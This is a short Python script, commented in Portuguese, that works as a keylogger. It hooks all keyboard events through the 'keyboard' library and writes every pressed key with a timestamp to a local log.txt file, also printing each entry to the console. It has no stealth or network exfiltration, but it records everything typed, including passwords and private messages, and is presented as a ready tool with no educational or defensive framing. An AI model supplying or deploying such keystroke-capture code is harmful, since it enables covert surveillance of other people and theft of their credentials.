import keyboard  # Biblioteca para capturar eventos de teclado
from datetime import datetime  # Biblioteca para manipular datas e horas

# Caminho completo para o arquivo
file_path = "log.txt"

# Abrir o arquivo para gravar as teclas
with open(file_path, "a") as file:
    while True:
        # Captura qualquer tecla pressionada
        event = keyboard.read_event()

        # Se a tecla for pressionada (evento KEY_DOWN)
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            # Captura a data e hora atual
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            # Formata a saída com a tecla e o horário
            log_entry = f"[{timestamp}] Tecla: {key}"
            print(log_entry)  # Exibe no console
            file.write(log_entry + "\n")  # Escreve no arquivo
            file.flush()  # Garante que o conteúdo seja gravado imediatamente
